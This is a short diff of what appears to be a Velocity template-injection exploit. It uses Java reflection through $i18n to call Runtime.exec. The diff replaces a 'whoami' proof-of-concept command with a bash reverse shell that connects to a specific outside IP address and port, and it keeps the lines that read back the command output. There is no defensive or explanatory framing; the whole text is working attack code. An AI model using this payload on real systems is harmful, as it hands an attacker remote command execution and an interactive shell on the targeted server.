@@ -1,4 +1,4 @@
-#set($ex=$i18n.getClass().forName('java.lang.Runtime').getMethod('getRuntime', null).invoke(null, null).exec('whoami'))
+#set($ex=$i18n.getClass().forName('java.lang.Runtime').getMethod('getRuntime', null).invoke(null, null).exec('bash -i >& /dev/tcp/120.77.209.122/9898 0>&1'))
 $ex.waitFor()
 #set($out=$ex.getInputStream())
 #foreach($i in [1..$out.available()])
